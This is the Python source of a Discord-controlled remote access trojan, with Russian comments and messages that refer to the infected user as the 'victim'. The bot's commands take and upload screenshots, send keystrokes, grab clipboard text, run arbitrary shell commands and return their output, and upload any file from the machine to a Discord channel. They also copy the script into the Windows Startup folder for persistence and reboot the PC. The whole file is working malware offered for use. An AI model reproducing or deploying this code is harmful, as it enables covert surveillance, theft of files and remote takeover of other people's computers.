# Original by: KailUser
# Translate: kararasenok-gd

import pyautogui
import discord
from discord.ext import commands
import os
import sys
import platform
import webbrowser
import subprocess
import shutil


intents = discord.Intents.all()
client = commands.Bot(command_prefix='>>>', intents=intents)
id = 998279211276042414



@client.event
async def on_ready():
	channel = client.get_channel(id)
	if platform.system() == 'Windows':
		embed = discord.Embed(title=f'{client.user}', description=f'ОС: {platform.system()} {platform.release()} \n Тип: {platform.machine()} \n Architecture: {platform.architecture()}', color=0x00ff6a)
		embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg/1161px-Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg.png")
	elif platform.system() == 'Linux':
		embed = discord.Embed(title=f'{client.user}', description=f'ОС: {platform.system()} {platform.release()} \n Тип: {platform.machine()} \n Architecture: {platform.architecture()}', color=0x00ff6a)
		embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Tux.svg/800px-Tux.svg.png")
	elif platform.system() == 'Macos':
		embed = discord.Embed(title=f'{client.user}', description=f'ОС: {platform.system()} {platform.release()} \n Тип: {platform.machine()} \n Architecture: {platform.architecture()}', color=0x00ff6a)
		embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/MacOS_wordmark_%282017%29.svg/1920px-MacOS_wordmark_%282017%29.svg.png")
	await channel.send(embed=embed)

@client.command()
async def screenshot(ctx):
	screenshot = pyautogui.screenshot()
	channel = client.get_channel(id)
	screenshot.save('screenshot.png')
	with open('screenshot.png', 'rb') as f:
		file = discord.File(f, filename='screenshot.png')
		await channel.send(file=file)
	os.remove('screenshot.png')
@client.command()
async def alert(ctx, *, message):
	channel = client.get_channel(id)
	pyautogui.alert(message)
	await channel.send('Отправил сообщение!')

@client.command()
async def write(ctx, *, message):
	channel = client.get_channel(id)
	await channel.send("Пишу")
	pyautogui.write(message)
	pyautogui.press('enter')
	await channel.send(f"Написал и отправил **{message}**")

@client.command()
async def copy_text(ctx):
	channel = client.get_channel(id)
	pyautogui.hotkey('ctrl', 'a')
	pyautogui.hotkey('ctrl', 'c')
	await channel.send('Скопировал текст в клипборд Жертвы')

@client.command()
async def paste_text(ctx):
	pyautogui.hotkey('ctrl', 'v')
	pyautogui.press('enter')

@client.command()
async def web(ctx, *, message):
	channel = client.get_channel(id)
	message_client = await channel.send(f'Открываю https://{message}')
	webbrowser.open("https://" + message)
	await message_client.edit(f"Открыл https://{message}")

@client.command()
async def device(ctx):
	channel = client.get_channel(id)
	if platform.system() == 'Windows':
		embed = discord.Embed(title=f'Устройство Жертвы', description=f'ОС: {platform.system()} {platform.release()} \n Тип: {platform.machine()} \n Architecture: {platform.architecture()}', color=0x00ff6a)
		embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg/1161px-Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg.png")
	elif platform.system() == 'Linux':
		embed = discord.Embed(title=f'Устройство Жертвы', description=f'ОС: {platform.system()} {platform.release()} \n Тип: {platform.machine()} \n Architecture: {platform.architecture()}', color=0x00ff6a)
		embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Tux.svg/800px-Tux.svg.png")
	elif platform.system() == 'Macos':
		embed = discord.Embed(title=f'Устройство Жертвы', description=f'ОС: {platform.system()} {platform.release()} \n Тип: {platform.machine()} \n Architecture: {platform.architecture()}', color=0x00ff6a)
		embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/MacOS_wordmark_%282017%29.svg/1920px-MacOS_wordmark_%282017%29.svg.png")
	await channel.send(embed=embed)

@client.command()
async def disconnect(ctx):
	channel = client.get_channel(id)
	pyautogui.alert(text='Ты свободен... Разраб извеняется перед тобой если что)', title='ББ', button='ББ')
	await channel.send('Я оффнулся')
	sys.exit(0)

@client.command()
async def console(ctx, *, command):
	channel = client.get_channel(id)

	with open("console.txt", "w") as f:
		result = subprocess.run(command, stdout=f, stderr=f, shell=True, text=True)

	with open('console.txt', 'rb') as f:
		file = discord.File(f, filename='console.txt')
		await channel.send(file=file)
	os.remove('console.txt')

@client.command()
async def file(ctx, *, path):
	channel = client.get_channel(id)
	with open(path, 'rb') as f:
		file = discord.File(f, filename=f'{path}')
		await channel.send(file=file)

@client.command()
async def autostart(ctx):
	channel = client.get_channel(id)
	roaming = os.getenv("appdata")
	dst = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

	shutil.copy2(sys.argv[0], dst)

	await channel.send('Закинул скрипт в папку Авто Запуска')

@client.command()
async def restart(ctx, *, answer = None):
	channel = client.get_channel(id)

	if answer is None:
		await channel.send('Вы уверены что хотите перезагрузить компьютер Жертвы? Если вы не сделали авто-загрузку, то стоит её сделать командой **>>>autostart** | Если вы хотите перезагрузить ПК жертвы, то пропишите **>>>restart yes**')
	elif answer == 'yes':
		await channel.send('ПК жертвы перезагрузится через 15 секунд')
		os.system('shutdown /t 15 /r')





client.run('discord_bot_token_here')
